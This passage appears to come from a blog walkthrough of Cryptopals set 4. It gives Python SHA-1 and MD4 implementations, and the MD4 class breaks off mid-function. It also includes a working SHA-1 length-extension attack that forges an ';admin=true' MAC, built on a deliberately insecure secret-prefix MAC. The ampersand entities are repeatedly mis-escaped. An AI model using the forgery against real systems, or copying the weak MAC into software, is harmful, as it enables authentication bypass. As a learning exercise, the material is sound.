<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sha1</span>(message: bytes, ml<span style="color:#f92672">=</span>None, h0<span style="color:#f92672">=</span><span style="color:#ae81ff">0x67452301</span>, h1<span style="color:#f92672">=</span><span style="color:#ae81ff">0xEFCDAB89</span>, h2<span style="color:#f92672">=</span><span style="color:#ae81ff">0x98BADCFE</span>, h3<span style="color:#f92672">=</span><span style="color:#ae81ff">0x10325476</span>, h4<span style="color:#f92672">=</span><span style="color:#ae81ff">0xC3D2E1F0</span>) <span style="color:#f92672">-&gt;</span> bytes:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Returns a string containing the SHA1 hash of the input message. This is a pure python 3 SHA1
</span><span style="color:#e6db74">    implementation, written starting from the SHA1 pseudo-code on Wikipedia.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    
    <span style="color:#75715e"># Pre-processing:</span>
    <span style="color:#66d9ef">if</span> ml <span style="color:#f92672">is</span> None:
        ml <span style="color:#f92672">=</span> len(message) <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>

    message <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x80</span><span style="color:#e6db74">&#39;</span>
    <span style="color:#66d9ef">while</span> (len(message) <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">512</span> <span style="color:#f92672">!=</span> <span style="color:#ae81ff">448</span>:
        message <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>

    message <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&gt;Q&#39;</span>, ml)

    <span style="color:#75715e"># Process the message in successive 512-bit chunks:</span>
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(message), <span style="color:#ae81ff">64</span>):

        <span style="color:#75715e"># Break chunk into sixteen 32-bit big-endian integers w[i]</span>
        w <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">80</span>
        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):
            w[j] <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#39;&gt;I&#39;</span>, message[i <span style="color:#f92672">+</span> j <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>:i <span style="color:#f92672">+</span> j <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>])[<span style="color:#ae81ff">0</span>]

        <span style="color:#75715e"># Extend the sixteen 32-bit integers into eighty 32-bit integers:</span>
        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">80</span>):
            w[j] <span style="color:#f92672">=</span> left_rotate(w[j <span style="color:#f92672">-</span> <span style="color:#ae81ff">3</span>] <span style="color:#f92672">^</span> w[j <span style="color:#f92672">-</span> <span style="color:#ae81ff">8</span>] <span style="color:#f92672">^</span> w[j <span style="color:#f92672">-</span> <span style="color:#ae81ff">14</span>] <span style="color:#f92672">^</span> w[j <span style="color:#f92672">-</span> <span style="color:#ae81ff">16</span>], <span style="color:#ae81ff">1</span>)

        <span style="color:#75715e"># Initialize hash value for this chunk:</span>
        a <span style="color:#f92672">=</span> h0
        b <span style="color:#f92672">=</span> h1
        c <span style="color:#f92672">=</span> h2
        d <span style="color:#f92672">=</span> h3
        e <span style="color:#f92672">=</span> h4

        <span style="color:#75715e"># Main loop</span>
        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">80</span>):
            <span style="color:#66d9ef">if</span> j <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">19</span>:
                f <span style="color:#f92672">=</span> d <span style="color:#f92672">^</span> (b <span style="color:#f92672">&amp;</span>amp;amp;amp;amp;amp;amp; (c <span style="color:#f92672">^</span> d))
                k <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x5A827999</span>
            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">20</span> <span style="color:#f92672">&lt;=</span> j <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">39</span>:
                f <span style="color:#f92672">=</span> b <span style="color:#f92672">^</span> c <span style="color:#f92672">^</span> d
                k <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x6ED9EBA1</span>
            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">40</span> <span style="color:#f92672">&lt;=</span> j <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">59</span>:
                f <span style="color:#f92672">=</span> (b <span style="color:#f92672">&amp;</span>amp;amp;amp;amp;amp;amp; c) <span style="color:#f92672">|</span> (d <span style="color:#f92672">&amp;</span>amp;amp;amp;amp;amp;amp; (b <span style="color:#f92672">|</span> c))
                k <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x8F1BBCDC</span>
            <span style="color:#66d9ef">else</span>:
                f <span style="color:#f92672">=</span> b <span style="color:#f92672">^</span> c <span style="color:#f92672">^</span> d
                k <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xCA62C1D6</span>

            temp <span style="color:#f92672">=</span> left_rotate(a, <span style="color:#ae81ff">5</span>) <span style="color:#f92672">+</span> f <span style="color:#f92672">+</span> e <span style="color:#f92672">+</span> k <span style="color:#f92672">+</span> w[j] <span style="color:#f92672">&amp;</span>amp;amp;amp;amp;amp;amp; <span style="color:#ae81ff">0xffffffff</span>
            e <span style="color:#f92672">=</span> d
            d <span style="color:#f92672">=</span> c
            c <span style="color:#f92672">=</span> left_rotate(b, <span style="color:#ae81ff">30</span>)
            b <span style="color:#f92672">=</span> a
            a <span style="color:#f92672">=</span> temp

        <span style="color:#75715e"># Add this chunk&#39;s hash to result so far:</span>
        h0 <span style="color:#f92672">=</span> (h0 <span style="color:#f92672">+</span> a) <span style="color:#f92672">&amp;</span>amp;amp;amp;amp;amp;amp; <span style="color:#ae81ff">0xffffffff</span>
        h1 <span style="color:#f92672">=</span> (h1 <span style="color:#f92672">+</span> b) <span style="color:#f92672">&amp;</span>amp;amp;amp;amp;amp;amp; <span style="color:#ae81ff">0xffffffff</span>
        h2 <span style="color:#f92672">=</span> (h2 <span style="color:#f92672">+</span> c) <span style="color:#f92672">&amp;</span>amp;amp;amp;amp;amp;amp; <span style="color:#ae81ff">0xffffffff</span>
        h3 <span style="color:#f92672">=</span> (h3 <span style="color:#f92672">+</span> d) <span style="color:#f92672">&amp;</span>amp;amp;amp;amp;amp;amp; <span style="color:#ae81ff">0xffffffff</span>
        h4 <span style="color:#f92672">=</span> (h4 <span style="color:#f92672">+</span> e) <span style="color:#f92672">&amp;</span>amp;amp;amp;amp;amp;amp; <span style="color:#ae81ff">0xffffffff</span>

    <span style="color:#75715e"># Produce the final hash value (big-endian) as a 160 bit number, hex formatted:</span>
    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%08x%08x%08x%08x%08x</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (h0, h1, h2, h3, h4)
</code></pre></div><p>The function works on producing the MAC based on SHA-1.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sha1_mac</span>(key: bytes, message: bytes) <span style="color:#f92672">-&gt;</span> bytes:
    <span style="color:#66d9ef">return</span> sha1(key <span style="color:#f92672">+</span> message)
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">keysize <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span>
random_key <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>urandom(keysize)
message <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;This is a message to test that our implementation of the SHA1 MAC works properly.&#34;</span>

hashed <span style="color:#f92672">=</span> sha1_mac(random_key, message<span style="color:#f92672">.</span>encode())

<span style="color:#75715e"># Verify that I implemented SHA1 correctly</span>
h <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha1(random_key <span style="color:#f92672">+</span> message<span style="color:#f92672">.</span>encode())
</code></pre></div>

<div style="border:1px solid #c3e6cb;padding:.75rem 3rem;border-radius:.5rem;font-weight:bold;text-align: center;background-color:#d4edda;color:#155724;border-color:#c3e6cb;">Completed</div>


<h3 id="challenge-29-break-a-sha-1-keyed-mac-using-length-extension">Challenge 29: Break a SHA-1 keyed MAC using length extension</h3>
<p><a href="https://cryptopals.com/sets/4/challenges/29">Link</a></p>
<blockquote>
<p>Secret-prefix SHA-1 MACs are trivially breakable.<br>
The attack on secret-prefix SHA1 relies on the fact that you can take the ouput of SHA-1 and use it as a new starting point for SHA-1, thus taking an arbitrary SHA-1 hash and &ldquo;feeding it more data&rdquo;.<br>
Since the key precedes the data in secret-prefix, any additional data you feed the SHA-1 hash in this fashion will appear to have been hashed with the secret key.<br>
To carry out the attack, you&rsquo;ll need to account for the fact that SHA-1 is &ldquo;padded&rdquo; with the bit-length of the message; your forged message will need to include that padding. We call this &ldquo;glue padding&rdquo;. The final message you actually forge will be:<br>
<strong>SHA1(key || original-message || glue-padding || new-message)</strong><br>
(where the final padding on the whole constructed message is implied)<br>
Note that to generate the glue padding, you&rsquo;ll need to know the original bit length of the message; the message itself is known to the attacker, but the secret key isn&rsquo;t, so you&rsquo;ll need to guess at it.<br>
This sounds more complicated than it is in practice.<br>
To implement the attack, first write the function that computes the MD padding of an arbitrary message and verify that you&rsquo;re generating the same padding that your SHA-1 implementation is using. This should take you 5-10 minutes.<br>
Now, take the SHA-1 secret-prefix MAC of the message you want to forge &mdash; this is just a SHA-1 hash &mdash; and break it into 32 bit SHA-1 registers (SHA-1 calls them &ldquo;a&rdquo;, &ldquo;b&rdquo;, &ldquo;c&rdquo;, &amp;c).<br>
Modify your SHA-1 implementation so that callers can pass in new values for &ldquo;a&rdquo;, &ldquo;b&rdquo;, &ldquo;c&rdquo; &amp;c (they normally start at magic numbers). With the registers &ldquo;fixated&rdquo;, hash the additional data you want to forge.<br>
Using this attack, generate a secret-prefix MAC under a secret key (choose a random word from /usr/share/dict/words or something) of the string:<br>
<strong>&ldquo;comment1=cooking%20MCs;userdata=foo;comment2=%20like%20a%20pound%20of%20bacon&rdquo;</strong><br>
Forge a variant of this message that ends with &ldquo;;admin=true&rdquo;.</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Imports</span>
<span style="color:#f92672">import</span> os
<span style="color:#f92672">import</span> struct
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Given</span>
message <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;comment1=cooking%20MCs;userdata=foo;comment2=</span><span style="color:#e6db74">%20li</span><span style="color:#e6db74">ke%20a%20pound</span><span style="color:#e6db74">%20o</span><span style="color:#e6db74">f%20bacon&#34;</span>
payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;;admin=true&#34;</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Generating a pseudo random key, to be run only once.</span>
key <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>urandom(<span style="color:#ae81ff">16</span>)
</code></pre></div><p>The padding function makes sure that the message received is sent in the form of a padded message. Since the last 64 bits of the block are reserved for the length of the message, the message is made sure to be (padded) upto 448 bits.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">md_pad</span>(message: bytes) <span style="color:#f92672">-&gt;</span> bytes:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Pads the message in accordance with SHA1 padding.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    ml <span style="color:#f92672">=</span> len(message) <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>
    message <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x80</span><span style="color:#e6db74">&#39;</span>
    <span style="color:#66d9ef">while</span> (len(message) <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">512</span> <span style="color:#f92672">!=</span> <span style="color:#ae81ff">448</span>:
        message <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>

    message <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&gt;Q&#39;</span>, ml)
    <span style="color:#66d9ef">return</span> message
    
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">validate</span>(modified_message: bytes, new_md: bytes) <span style="color:#f92672">-&gt;</span> bool:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Verifies the MAC.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    <span style="color:#66d9ef">if</span> sha1_mac(key, modified_message) <span style="color:#f92672">==</span> new_md:
        <span style="color:#66d9ef">return</span> True
    <span style="color:#66d9ef">return</span> False
</code></pre></div><p>From the implementation, we know that the value returned from SHA1 is <em>(H0 &laquo; 128) | (H1 &laquo; 96) | (H2 &laquo; 64) | (H3 &laquo; 32) | H4</em>.</p>
<p>The output can therefore be dissolved back into <em>H0</em>, <em>H1</em>, <em>H2</em>, <em>H3</em>, and <em>H4</em>. These values are then used to instantiate a new SHA-1 oracle, and this new oracle can resume computation from this point on.</p>
<p>Now, when we get the hash <em>h</em> for a message <em>m</em>, we can compute the padding <em>p</em> applied to it. Let&rsquo;s assume that we know <em>m</em> and we want to compute has for a message <em>m&rsquo;</em>. A padding <em>p&rsquo;</em> will be in order. The final message comes out to be <em>m||p||m'||p&rsquo;</em>. Since <em>m||p</em> is already 512 bits, <em>m'||p&rsquo;</em> will be computed in it&rsquo;s own block. But wait, what if we already have the intermediary state between the blocks of <em>m||p</em> and <em>m'||p&rsquo;</em> ? We could just resume the computation of <em>m'||p&rsquo;</em> and just ignore the <em>m||p</em>. Well we do have the intermediary state. It&rsquo;s the hash of <em>m||p</em>. Therefore, we could just use the hash of any random message, and use it&rsquo;s value to sign any message we want to, and it would have a valid MAC. The implications of this are major. It makes forgery really easy and straight forward. </p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sha1_length_extension_attack</span>(message: bytes, original_md: bytes, payload: bytes) <span style="color:#f92672">-&gt;</span> (bytes, bytes):
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Perform the SHA1 length extension attack.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    <span style="color:#66d9ef">for</span> key_length <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">20</span>):
        h <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#39;&gt;5I&#39;</span>, bytes<span style="color:#f92672">.</span>fromhex(original_md))
        modified_message <span style="color:#f92672">=</span> md_pad(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span>key_length <span style="color:#f92672">+</span> message)[key_length:] <span style="color:#f92672">+</span> payload
        new_md <span style="color:#f92672">=</span> sha1(payload, (len(modified_message) <span style="color:#f92672">+</span> key_length)<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>, h[<span style="color:#ae81ff">0</span>], h[<span style="color:#ae81ff">1</span>], h[<span style="color:#ae81ff">2</span>], h[<span style="color:#ae81ff">3</span>], h[<span style="color:#ae81ff">4</span>])
        <span style="color:#66d9ef">if</span> validate(modified_message, new_md):
            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;&gt; Length extension attack successful.&#34;</span>)
            <span style="color:#66d9ef">return</span> modified_message, new_md
            <span style="color:#66d9ef">break</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">original_md <span style="color:#f92672">=</span> sha1_mac(key, message<span style="color:#f92672">.</span>encode())
modified_message, new_md <span style="color:#f92672">=</span> sha1_length_extension_attack(message<span style="color:#f92672">.</span>encode(), original_md, payload)
</code></pre></div><p><code>&gt; Length extension attack successful.</code></p>


<div style="border:1px solid #c3e6cb;padding:.75rem 3rem;border-radius:.5rem;font-weight:bold;text-align: center;background-color:#d4edda;color:#155724;border-color:#c3e6cb;">Completed</div>


<h3 id="challenge-30-break-an-md4-keyed-mac-using-length-extension">Challenge 30: Break an MD4 keyed MAC using length extension</h3>
<p><a href="https://cryptopals.com/sets/4/challenges/30">Link</a></p>
<blockquote>
<p>Second verse, same as the first, but use MD4 instead of SHA-1. Having done this attack once against SHA-1, the MD4 variant should take much less time; mostly just the time you&rsquo;ll spend Googling for an implementation of MD4.</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Imports</span>
<span style="color:#f92672">import</span> os
<span style="color:#f92672">import</span> struct
<span style="color:#f92672">import</span> binascii
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Given</span>
message <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;comment1=cooking%20MCs;userdata=foo;comment2=</span><span style="color:#e6db74">%20li</span><span style="color:#e6db74">ke%20a%20pound</span><span style="color:#e6db74">%20o</span><span style="color:#e6db74">f%20bacon&#34;</span>
payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;;admin=true&#34;</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Generating a pseudo random key, to be run only once.</span>
key <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>urandom(<span style="color:#ae81ff">16</span>)
</code></pre></div><p>There are four internal state variables - A, B, C, D, each 32 bits. These are initialized to:</p>
<p><code>word A: 01 23 45 67</code><br>
<code>word B: 89 ab cd ef</code><br>
<code>word C: fe dc ba 98</code><br>
<code>word D: 76 54 32 10</code></p>
<p>We also use a table of 64 values generated from the <em>sine</em> function, <em>self.k</em>.</p>
<p>For each chunk, which is 512 bits, we unpack into 16 words of 32-bits.</p>
<p>Then, we do 64 transforms, split into four rounds. each transform taking: an incrementing-by-one index into the <em>sin table</em>, a function <em>f</em> specific to the round, a <em>lrot</em> value, and an index into our array of 16 words.</p>
<p>At the end of each transform, the values are updated as follows:</p>
<p><em>a, b, c, d = d, x &amp;</em> <em>0xffffffff</em>_, b, c_</p>
<p>where <em>x</em> is the result of the transform.</p>
<p>The message digest produced as output is the concat of <em>A</em>, <em>B</em>, <em>C</em>, <em>D</em>, and it is 128 bits, or 16-bytes in length.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">MD4</span>:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    This implementation resembles the one of the Wikipedia pseudo-code.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    
    buf <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0x00</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">64</span>

    _F <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> self, x, y, z: ((x <span style="color:#f92672">&amp;</span>amp;amp;amp;amp;amp;amp; y) <span style="color:#f92672">|</span> (<span style="color:#f92672">~</span>x <span style="color:#f92672">&amp;</span>amp;amp;amp;amp;amp;amp; z))
    _G <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> self, x, y, z: ((x <span style="color:#f92672">&amp;</span>amp;amp;amp;amp;amp;amp; y) <span style="color:#f92672">|</span> (x <span style="color:#f92672">&amp;</span>amp;amp;amp;amp;amp;amp; z) <span style="color:#f92672">|</span> (y <span style="color:#f92672">&amp;</span>amp;amp;amp;amp;amp;amp; z))
    _H <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> self, x, y, z: (x <span style="color:#f92672">^</span> y <span style="color:#f92672">^</span> z)

    <span style="color:#66d9ef">def</span> __init__(self: object, message: bytes, ml<span style="color:#f92672">=</span>None, A<span style="color:#f92672">=</span><span style="color:#ae81ff">0x67452301</span>, B<span style="color:#f92672">=</span><span style="color:#ae81ff">0xefcdab89</span>, C<span style="color:#f92672">=</span><span style="color:#ae81ff">0x98badcfe</span>, D<span style="color:#f92672">=</span><span style="color:#ae81ff">0x10325476</span>):
        self<span style="color:#f92672">.</span>A, self<span style="color:#f92672">.</span>B, self<span style="color:#f92672">.</span>C, self<span style="color:#f92672">.</span>D <span style="color:#f92672">=</span> A, B, C, D

        <span style="color:#66d9ef">if</span> ml <span style="color:#f92672">is</span> None:
            ml <span style="color:#f92672">=</span> len(message) <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>
        length <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;Q&#39;</span>, ml)

        <span style="color:#66d9ef">while</span> len(message) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">64</span>:
            self<span style="color:#f92672">.</span>_handle(message[:<span style="color:#ae81ff">64</span>])
            message <span style="color:#f92672">=</span> message[<span style="color:#ae81ff">64</span>:]

        message <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x80</span><span style="color:#e6db74">&#39;</span>
        message <span style="color:#f92672">+=</span> bytes((<span style="color:#ae81ff">56</span> <span style="color:#f92672">-</span> len(message) <span style="color:#f92672">%</span> <span style="color:#ae81ff">64</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">64</span>)
        message <span style="color:#f92672">+=</span> length

        <span style="color:#66d9ef">while</span> len(message):
            self<span style="color:#f92672">.</span>_handle(message[:<span style="color:#ae81ff">64</span>])
            message <span style="color:#f92672">=</span> message[<span style="color:#ae81ff">64</span>:]

    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_handle</span>(self: object, chunk: bytes):
        X <span style="color:#f92672">=</span> list(struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#39;&lt;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;I&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">16</span>, chunk))
        A, B, C, D <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>A, self<span style="color:#f92672">.</span>B, self<span style="color:#f92672">.</span>C, self<span style="color:#f92672">.</span>D

        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):
            k <span style="color:#f92672">=</span> i
            <span style="color:#66d9ef">if</span> i <span style="color:#f92672">%</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
                A <span style="color:#f92672">=</span> left_rotate((A <span style="color:#f92672">+</span> self<span style="color:#f92672">.</span>_F(B, C, D) <span style="color:#f92672">+</span> X[k]) <span style="color:#f92672">&amp;</span>amp;amp;amp;amp;amp;amp; <span style="color:#ae81ff">0xffffffff</span>, <span style="color:#ae81ff">3</span>)
            <span style="color:#66d9ef">elif</span> i <span style="color:#f92672">%</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
                D <span style="color:#f92672">=</span> left_rotate((D <span style="color:#f92672">+</span> self<span style="color:#f92672">.</span>_F(A, B, C) <span style="color:#f92672">+</span> X[k]) <span style="color:#f92672">&amp;</span>amp;amp;amp;amp;amp;amp; <span style="color:#ae81ff">0xffffffff</span>, <span style="color:#ae81ff">7</span>)
            <span style="color:#66d9ef">elif</span> i <span style="color:#f92672">%</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>:
                C <span style="color:#f92672">=</span> left_rotate((C <span style="color:#f92672">+</span> self<span style="color:#f92672">.</span>_F(D, A, B) <span style="color:#f92672">+</span> X[k]) <span style="color:#f92672">&amp;</span>amp;amp;amp;amp;amp;amp; <span style="color:#ae81ff">0xffffffff</span>, <span style="color:#ae81ff">11</span>)
            <span style="color:#66d9ef">elif</span> i <span style="color:#f92672">%</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span>:
                B <span style="color:#f92672">=</span> left_rotate((B <span style="color:#f92672">+</span> self<span style="color:#f92672">.</span>_F(C, D, A) <span style="color:#f92672">+</span> X[k]) <span style="color:#f92672">&amp;</span>amp;amp;amp;amp;amp;amp; <span style="color:#ae81ff">0xffffffff</span>, <span style="color:#ae81ff">19</span>)

        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):
            k <span style="color:#f92672">=</span> (i <span style="color:#f92672">//</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">+</span> (i <span style="color:#f92672">%</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>
            <span style="color:#66d9ef">if</span> i <span style="color:#f92672">%</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
                A <span style="color:#f92672">=</span> left_rotate((A <span style="color:#f92672">+</span> self<span style="color:#f92672">.</span>_G(B, C, D) <span style="color:#f92672">+</span> X[k] <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x5a827999</span>) <span style="color:#f92672">&amp;</span>amp;amp;amp;amp;amp;amp; <span style="color:#ae81ff">0xffffffff</span>, <span style="color:#ae81ff">3</span>)
            <span style="color:#66d9ef">elif</span> i <span style="color:#f92672">%</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
                D <span style="color:#f92672">=</span> left_rotate((D <span style="color:#f92672">+</span> self<span style="color:#f92672">.</span>_G(A, B, C) <span style="color:#f92672">+</span> X[k] <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x5a827999</span>) <span style="color:#f92672">&amp;</span>amp;amp;amp;amp;amp;amp; <span style="color:#ae81ff">0xffffffff</span>, <span style="color:#ae81ff">5</span>)
            <span style="color:#66d9ef">elif</span> i <span style="color:#f92672">%</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>:
                C <span style="color:#f92672">=</span> left_rotate((C <span style="color:#f92672">+</span> self<span style="color:#f92672">.</span>_G(D, A, B) <span style="color:#f92672">+</span> X[k] <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x5a827999</span>) <span style="color:#f92672">&amp;</span>amp;amp;amp;amp;amp;amp; <span style="color:#ae81ff">0xffffffff</span>, <span style="color:#ae81ff">9</span>)
            <span style="color:#66d9ef">elif</span> i <span style="color:#f92672">%</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span>:
                B <span style="color:#f92672">=</span> left_rotate((B <span style="color:#f92672">+</span> self<span style="color:#f92672">.</span>_G(C, D, A) <span style="color:#f92672">+</span> X[k] <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x5a827999</span>) <span style="color:#f92672">&amp;</span>amp;amp;amp;amp;amp;amp; <span style="color:#ae81ff">0xffffffff</span>, <span style="color:#ae81ff">13</span>)

        order <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">15</span>]
        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):
            k <span style="color:#f92672">=</span> order[i]
            <span style="color:#66d9ef">if</span> i <span style="color:#f92672">%</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
